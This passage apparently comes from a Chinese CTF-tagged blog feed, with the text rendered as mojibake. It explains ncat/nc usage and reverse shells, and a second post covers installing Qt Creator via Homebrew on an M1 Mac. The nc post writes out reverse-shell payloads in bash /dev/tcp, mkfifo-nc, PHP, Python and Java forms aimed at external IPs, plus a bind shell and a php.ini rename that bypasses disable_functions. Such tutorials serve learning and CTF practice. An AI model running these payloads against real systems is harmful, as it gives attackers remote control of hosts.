å®¢æˆ·ç«¯æ–­æ‰è¿æ¥æ—¶ï¼ŒæœåŠ¡ç«¯ä¾ç„¶ä¿æŒè¿è¡Œ<br><code>-v</code>ï¼šç°å®æŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ç»†èŠ‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -lvk -e  /bin/bash 2333<br></code></pre></td></tr></table></figure><blockquote><p>å®¢æˆ·ç«¯ä½¿ç”¨<code>CTRL + c</code>æˆ–<code>CTRL + d</code>æ–­å¼€è¿æ¥çš„æ—¶å€™ï¼Œç›‘å¬ç«¯çš„ ncat ä¾ç„¶åœ¨è¿è¡Œï¼Œè¿™æ ·æ–¹ä¾¿å®¢æˆ·ç«¯ä¸‹æ¬¡ç›´æ¥ nc è¿è¿›æ¥</p></blockquote><h3 id="æ–‡ä»¶ä¼ è¾“"><a href="#æ–‡ä»¶ä¼ è¾“" class="headerlink" title="æ–‡ä»¶ä¼ è¾“"></a>æ–‡ä»¶ä¼ è¾“</h3><h4 id="ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹"></a>ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹</h4><p>root@Slothè¿œç¨‹æœåŠ¡å™¨è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p>macOS æœ¬åœ°è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &lt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255144.jpg" alt="image-20220926011113841"></p><blockquote><p>æ­¤æ—¶ä¼šå°† macOS çš„æ–‡ä»¶ä¼ è¾“åˆ°è¿œç¨‹çš„ CentOS æœåŠ¡å™¨ä¸Šï¼Œä¼ è¾“å®Œæˆåï¼Œä¸¤ä¸ª ncat ä¼šè¯éƒ½å°†ç»ˆæ­¢ã€‚</p></blockquote><h4 id="ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶"><a href="#ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶"></a>ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶</h4><p>root@Slothè¿œç¨‹æœåŠ¡å™¨è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &lt; hello.txt <br></code></pre></td></tr></table></figure><p>macOS æœ¬åœ°è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255056.jpg" alt="image-20220926011518092"></p><blockquote><p>è¿™é‡Œæ–‡ä»¶ä¼ è¾“å®Œæˆåä¸ä¼šæ˜¾ç¤ºä»»ä½•å†…å®¹ï¼Œå¹¶ä¸”ä¸¤ä¸ª Ncat å®ä¾‹å°†ç»§ç»­å·¥ä½œ(ä½†ä¸èƒ½æ–‡å­—å’Œå‘½ä»¤äº¤äº’)</p></blockquote><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>ncat ä¸æ”¯æŒç«¯å£èŒƒå›´æ‰«æï¼Œä½†æ˜¯åŸå§‹çš„ nc (macä¸Šå¯ä»¥ç”¨brewè£…netcat)å¯ä»¥æ‰«æç«¯å£</p><ul><li><h4 id="èŒƒå›´æ‰«æ"><a href="#èŒƒå›´æ‰«æ" class="headerlink" title="èŒƒå›´æ‰«æ"></a>èŒƒå›´æ‰«æ</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255349.jpg" alt="image-20220926012145161"></p><blockquote><p><code>-n</code>: ç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨<br><code>-z</code>: ä½¿ç”¨0è¾“å…¥&#x2F;è¾“å‡ºæ¨¡å¼%ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨</p></blockquote></li><li><h4 id="å•ä¸ªæ‰«æ"><a href="#å•ä¸ªæ‰«æ" class="headerlink" title="å•ä¸ªæ‰«æ"></a>å•ä¸ªæ‰«æ</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255336.jpg" alt="image-20220926012300304"></p></li></ul><h3 id="vps-ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› "><a href="#vps-ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› " class="headerlink" title="vps ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› "></a>vps ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› </h3><ul><li><p>æœ¬æœºæœªç›‘å¬ï¼Œtcpè¿æ¥è¦è®©æœ¬æœºå…ˆåœ¨å¯¹åº”ç«¯å£ç›‘å¬æ‰èƒ½å»ºç«‹ï¼Œè€Œudpä¸ç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬å›æ˜¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: Connection refused.<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨åŸå§‹ncï¼Œåˆ™è¡¨ç°ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œå‘½ä»¤ç›´æ¥ç»“æŸ</p></li><li><p>ç«¯å£æœªæ”¾è¡Œ:ä¸€èˆ¬å›æ˜¾è¡¨ç°ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: TIMEOUT.<br>æˆ–<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨åŸå§‹ncåˆ™æ˜¯ç­‰å¾…è¾ƒé•¿æ—¶é—´ï¼Œå‘½ä»¤ç»“æŸï¼Œæ²¡æœ‰å›æ˜¾</p></li><li><p>ä½¿ç”¨çš„æœ¬æœºipä¸æ˜¯å…¬ç½‘ip</p></li><li><p>ç»æµ‹è¯•ï¼Œå¯èƒ½æ˜¯å› ä¸ºç«¯å£æœªæ”¾è¡Œï¼Œè¿™å¯èƒ½éœ€è¦é…ç½®è·¯ç”±å™¨çš„é˜²ç«å¢™</p></li></ul><h3 id="å¸¸è§options"><a href="#å¸¸è§options" class="headerlink" title="å¸¸è§options"></a>å¸¸è§options</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">-l å¯åŠ¨ç›‘å¬<br>-p&lt;ç«¯å£å·&gt; è¡¨ç¤ºæŒ‡å®šç«¯å£<br>-v æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹<br>-u udpè¿æ¥<br>-n ç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œä¸ç”¨åŸŸåè§£æ<br>-w&lt;è¶…æ—¶ç§’æ•°&gt;   è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´<br>-z  ä½¿ç”¨0è¾“å…¥/è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨<br></code></pre></td></tr></table></figure><h2 id="åå¼¹Shell"><a href="#åå¼¹Shell" class="headerlink" title="åå¼¹Shell"></a>åå¼¹Shell</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>vpsç›‘å¬æŸä¸ªç«¯å£ï¼Œè¢«æ§åˆ¶ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºä¼ åˆ°æ§åˆ¶ç«¯</p><h3 id="å†…ç½‘å¼¹shell"><a href="#å†…ç½‘å¼¹shell" class="headerlink" title="å†…ç½‘å¼¹shell"></a>å†…ç½‘å¼¹shell</h3><p>ncatçš„-e ç»è¿‡ç®€å•è°ƒæ•´ï¼Œå¯ä»¥è®©vpsä¸å†…ç½‘æœºå™¨è¿›è¡Œå‘½ä»¤äº¤äº’</p><p>root@Slothå…ˆç›‘å¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -lvp 3344<br></code></pre></td></tr></table></figure><p>å†…ç½‘çš„ macOS è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -w 10 -e /bin/bash 124.221.124.106 3344<br></code></pre></td></tr></table></figure><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc  124.221.124.106 3344 -e /bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255233.jpg" alt="image-20220926013811064"></p><blockquote><p>å¦‚æœç›®æ ‡ä¸»æœºlinuxå‘è¡Œç‰ˆæœ¬æ²¡æœ‰ -e å‚æ•°ï¼Œè¿˜æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f ; mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f | <span class="hljs-regexp">/bin/</span>bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | nc x.x.x.x <span class="hljs-number">2333</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure><p><img src="/../../../Pictures/%60nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%60/e6c9d24egy1h6kgeanctvj21r80l6tiz.jpg" alt="image-20220927000457356"></p><ul><li><code>rm /tmp/f</code> åˆ é™¤å‘½ä»¤</li><li><code>mkfifo /tmp/f;</code> åœ¨tmpç›®å½•ä¸‹å†™fifoæ–‡ä»¶f</li><li><code>/bin/bash -i 2&gt;&amp;1</code> å°†&#x2F;bin&#x2F;bash çš„æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>å°†ncç›‘å¬åˆ°çš„è¾“å…¥ è¾“å…¥åˆ°fifo</li><li><code>cat /tmp/f</code> å°†æ‰§è¡Œç»“æœå›æ˜¾</li></ul></blockquote><h3 id="bashå¼¹shell"><a href="#bashå¼¹shell" class="headerlink" title="bashå¼¹shell"></a>bashå¼¹shell</h3><p>è¿™ä¹Ÿæ˜¯å¸¸ç”¨çš„åå¼¹shell payload</p><p>âš ï¸æ³¨æ„ï¼šjavaå‘½ä»¤æ‰§è¡Œæ—¶ï¼Œä¼šæ ¹æ®ç©ºæ ¼åˆ†å‰²å‚æ•°ã€‚å› æ­¤æœ€å¥½ä¸è¦ç›´æ¥ä¼ ç±»ä¼¼ä¸‹é¢ç¬¬äºŒæ¡è¿™ç§</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1<br>bash -c &quot;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&quot;   #é€‚ç”¨sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">é€‚é…javaçš„</span><br>String[] s = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#x27;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&#x27;&quot;&#125;;<br>Runtime.getRuntime().exec(s);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255967.jpg" alt="image-20220927204310944"></p><table><thead><tr><th>å‘½ä»¤</th><th>å‚æ•°è§£é‡Š</th></tr></thead><tbody><tr><td>bash -i</td><td>äº§ç”Ÿä¸€ä¸ª bash äº¤äº’ç¯å¢ƒ</td></tr><tr><td>&gt;&amp;</td><td>å°†è”åˆç¬¦å·å‰é¢çš„å†…å®¹ä¸åé¢ç»“åˆç„¶åä¸€èµ·é‡å®šå‘ç»™åè€…</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;10.211.55.4&#x2F;2333</td><td>æ‰“å¼€<code>/dev/tcp</code>è¿™ä¸ªæ–‡ä»¶å°±ç±»ä¼¼äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥,åé¢è·Ÿç›®æ ‡ipå’Œç›®æ ‡ç«¯å£</td></tr><tr><td>0&gt;&amp;1</td><td>ä½¿å¾—æ”»å‡»æ–¹å¯ä»¥çœ‹åˆ°è¾“å…¥åˆ°å‘½ä»¤ä»¥åŠæ‰§è¡Œç»“æœ</td></tr></tbody></table><blockquote><ul><li><p>å…¶å®<code>/dev/tcp</code>åœ¨æ ¹ç›®å½•ä¸‹å¹¶ä¸å­˜åœ¨ï¼Œä¹‹æ‰€ä»¥èƒ½åœ¨å‘½ä»¤ä¸­ä½¿ç”¨ï¼Œæ˜¯å› ä¸ºbashæºç å¯¹å…¶åšäº†ç›¸å…³é¢„å®šä¹‰</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255199.jpg" alt="image-20220926171832801"></p></li><li><p>å¦‚æœæ”»å‡»ç›®æ ‡æ˜¯mac osç³»ç»Ÿï¼Œä½¿ç”¨å†…ç½‘å¼¹shellçš„payloadå¯ä»¥æˆåŠŸï¼Œbashå¼¹shellçš„payloadå¯èƒ½å¤±è´¥</p><ul><li><p>åŸå› ï¼šç°åœ¨çš„macéƒ½å·²ç»ä½¿ç”¨zshä½œä¸ºé»˜è®¤shellï¼Œè€Œzshå¹¶æ²¡æœ‰å¯¹<code>/dev/tcp</code>åšç›¸å…³å¤„ç†ï¼Œæ‰§è¡Œpayloadä¼šå›æ˜¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zsh: no such file or directory: /proc/net/tcp/110.42.158.239/2333<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœè¦ä½¿ç”¨bashå¼¹shellè¦å…ˆåˆ‡æ¢å½“å‰ä½¿ç”¨shellï¼Œå¯ä»¥<code>sudo su</code>è¾“å…¥å½“å‰ç”¨æˆ·å¯†ç åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œé»˜è®¤ä½¿ç”¨sh</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256550.jpg" alt="image-20220926172537373"></p></li><li><p>æˆ–è€…æ›´æ”¹shellä¸ºbash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chsh -s /bin/bash<br></code></pre></td></tr></table></figure></li></ul></li></ul></blockquote><h4 id="å…¶ä»–å½¢å¼"><a href="#å…¶ä»–å½¢å¼" class="headerlink" title="å…¶ä»–å½¢å¼"></a>å…¶ä»–å½¢å¼</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 124.221.124.106 3344 &gt; /tmp/f<br></code></pre></td></tr></table></figure><blockquote><ul><li>ç¬¬ä¸€æ¡å‘½ä»¤ å»ºç«‹ä¸x.x.x.x:4444çš„tcpè¿æ¥ï¼Œå¹¶å°†æ ‡å‡†è¾“å…¥è¾“å‡ºä½œä¸ºdevice 5çš„æ ‡å‡†è¾“å…¥è¾“å‡º</li><li>ç¬¬äºŒæ¡cat &lt;&amp;5 è·å–device5çš„è¾“å…¥; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> ä¸€æ—¦è·å–åˆ°å‘½ä»¤ä¾¿è¿è¡Œ ç„¶åå°†æ ‡å‡†è¾“å…¥è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºåˆ°device5ä¸­</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256792.jpg" alt="image-20220926224353002"></p><h3 id="åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell"><a href="#åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell" class="headerlink" title="åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell"></a>åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell</h3><p>1ã€åŸºäºPHPçš„åå¼¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure><p>2ã€åŸºäºpythonåå¼¹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;ip&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>ä½¿ç”¨socketå»ºç«‹èµ·tcpè¿æ¥</p><p>os.dup2() æ–¹æ³•ç”¨äºå°†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ fd å¤åˆ¶åˆ°å¦ä¸€ä¸ª fd2ï¼Œè¿™é‡Œå°†æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯éƒ½é›†æˆåˆ°å½“å‰socketçš„æ–‡ä»¶æè¿°ç¬¦ä¸Š,ç„¶åå†äº§ç”Ÿä¸€ä¸ª bash äº¤äº’ç¯å¢ƒ</p></blockquote><p>2ã€å—åˆ°disable_functionså½±å“ï¼Œå¯¼è‡´fsockopenæˆ–è€…execä¸å¯ç”¨ã€‚<br>å½“ç›‘å¬ç«¯æ”¶ä¸åˆ°è¿æ¥å°±æ˜¯fsockopenè¢«ç¦ç”¨ï¼Œåˆæˆ–è€…æ”¶åˆ°è¿æ¥ååˆç«‹é©¬æ–­å¼€åˆ™æ˜¯execè¢«ç¦ç”¨<br>è§£å†³æ–¹æ³•ï¼š<br>phpåœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œæ—¶ä¿®æ”¹ php.ini æ˜¯ç«‹å³ç”Ÿæ•ˆçš„ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥é‡å‘½åphp.iniæ–‡ä»¶å³å¯:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv /etc/php.ini /etc/php.ini.bak<br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæ–‡ä»¶ä½ç½®å¹¶ä¸æ˜¯ä¸€å®šåœ¨è¿™é‡Œã€‚å¯ä»¥æŠŠå¸¸ç”¨ä½ç½®éƒ½è¯•ä¸€éã€‚å½“ç„¶äº†ï¼Œå®æˆ˜ä¸­å¯åƒä¸‡ä¸è¦è¿™ä¹ˆæï¼Œä¸šåŠ¡çƒ‚äº†å°±å‘œå‘œå‘œäº†ã€‚</p><p>å‚è€ƒåšå®¢:</p><ol><li><a href="https://blog.csdn.net/haoge1998/article/details/124259580?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa">åå¼¹shellåŸç†</a></li><li><a href="https://www.sqlsec.com/2019/10/nc.html">ncå‘½ä»¤æ•™ç¨‹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> nc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>M1 macä¸‹æ­å»ºä½¿ç”¨qt creator + QMYSQLé©±åŠ¨</title>
      <link href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/"/>
      <url>/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="ğŸ’¡å‰æï¼šå®‰è£…Xcode"><a href="#ğŸ’¡å‰æï¼šå®‰è£…Xcode" class="headerlink" title="ğŸ’¡å‰æï¼šå®‰è£…Xcode"></a>ğŸ’¡å‰æï¼šå®‰è£…Xcode</h3><h2 id="å®‰è£…homebrew"><a href="#å®‰è£…homebrew" class="headerlink" title="å®‰è£…homebrew"></a>å®‰è£…homebrew</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;<br></code></pre></td></tr></table></figure><p>é€‰æ‹©ä¸­ç§‘å¤§é•œåƒï¼Œå¹¶å®‰è£…å¼¹çª—ä¸­çš„å‘½ä»¤è¡Œå¼€å‘è€…å·¥å…·ï¼Œå®‰è£…å®Œå†æ‰§è¡Œä»¥ä¸Šå‘½ä»¤</p><p>åˆ‡æ¢å›½å†…å®‰è£…æº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &quot;$(brew --repo)&quot; &amp;&amp; git remote set-url origin git://mirrors.ustc.edu.cn/brew.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-cask&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git &amp;&amp; cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-cask-versions &amp;&amp; git remote set-url origin https://github.com/Homebrew/homebrew-cask-versions.git<br></code></pre></td></tr></table></figure><p>é‡å¯ç»ˆç«¯ï¼Œä¸‹è½½qt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt<br></code></pre></td></tr></table></figure><p>æ£€éªŒæ˜¯å¦å®‰è£…æˆåŠŸ,æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå›æ˜¾ä¿¡æ¯æ¯”è¾ƒå¤šï¼Œå¯ä»¥çœ‹è§è·¯å¾„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew info qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ub18t5pfj20vm0jq7a1.png" alt="1"></p><h2 id="å®‰è£…HomeBrew-Cask"><a href="#å®‰è£…HomeBrew-Cask" class="headerlink" title="å®‰è£…HomeBrew-Cask"></a>å®‰è£…HomeBrew-Cask</h2><p>caskå¯ä»¥å®‰è£….appçš„è½¯ä»¶</p><p>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨å›½å†…æºæ‰‹åŠ¨cloneä¸‹è½½ï¼ˆæ¨èï¼‰<br>åˆ›å»ºhomebrew-caskæ–‡ä»¶å¤¹<br>è¿›å…¥homebrewç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>/Library/Taps/homebrew/&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºhomebrew-caskæ–‡ä»¶å¤¹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir homebrew-cask<br></code></pre></td></tr></table></figure><p>å¼€å§‹clone</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone git:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/homebrew-cask.git/u</span>sr<span class="hljs-regexp">/local/</span>Homebrew<span class="hljs-regexp">/Library/</span>Taps<span class="hljs-regexp">/homebrew/</span>homebrew-cask<br></code></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šåˆ©ç”¨å®˜ç½‘æ–‡ä»¶å®‰è£…<br>ä»å®˜ç½‘ä¸Šä¸‹è½½<code>homebrew-cask-master.zip</code>å‹ç¼©åŒ…ï¼Œè§£å‹åå°†æ–‡ä»¶å¤¹åæ”¹ä¸º<code>homebrew-cask</code><br>ç„¶åå°†å…¶æ‹·è´æ”¾å…¥<code>/usr/local/Homebrew/Library/Taps/homebrew</code>ä¸­ï¼Œä¸<code>homebrew-core</code>æ–‡ä»¶å¤¹åŒçº§    </p><blockquote><p>å®˜ç½‘: <a href="https://github.com/Homebrew/homebrew-cask">https://github.com/Homebrew/homebrew-cask</a></p></blockquote><h2 id="å®‰è£…qt-creator"><a href="#å®‰è£…qt-creator" class="headerlink" title="å®‰è£…qt creator"></a>å®‰è£…qt creator</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>qt-creator<br></code></pre></td></tr></table></figure><p>å®‰è£…å®Œå‘ç°å¯åŠ¨å°å¤šäº†ä¸€ä¸ªè½¯ä»¶ï¼Œæ‰“å¼€</p><p><img src="/../images/e6c9d24egy1h1ub7miil3j20bo086wej.png" alt="."></p><h2 id="é…ç½®qt-creator"><a href="#é…ç½®qt-creator" class="headerlink" title="é…ç½®qt creator"></a>é…ç½®qt creator</h2><p>æ‰“å¼€é¦–é€‰é¡¹<img src="/../images/e6c9d24egy1h1ub8lv3wbj20ds0e6gmk.png?" alt="."></p><p>é…ç½®kitsï¼Œä¸»è¦æ˜¯Qt Versionå’ŒDebuggers</p><p>e6c9d24egy1h1ub8lv3wbj20ds0e6gmk<img src="/../images/e6c9d24egy1h1ucbt7jxhj21ef0u0jvk.png" alt="2"></p><h3 id="é…ç½®Qt-Version"><a href="#é…ç½®Qt-Version" class="headerlink" title="é…ç½®Qt Version"></a>é…ç½®Qt Version</h3><p>åœ¨ç»ˆç«¯å…ˆæŸ¥çœ‹qtè·¯å¾„</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">brew</span> <span class="hljs-literal">info</span> qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucdiut0nj21ce0hoq9l.png" alt="3"></p><blockquote><p>ä»¥æˆ‘è¿™é‡Œä¸ºä¾‹æ˜¯åœ¨<code>/opt/homebrew/Cellar/qt/6.2.3_1</code></p></blockquote><p>è¿›å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œè®¿é—®<code>bin</code>æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°qmakeæ–‡ä»¶ï¼Œæœ€åå°†è¯¥è·¯å¾„å¡«å…¥Qt version</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>qt<span 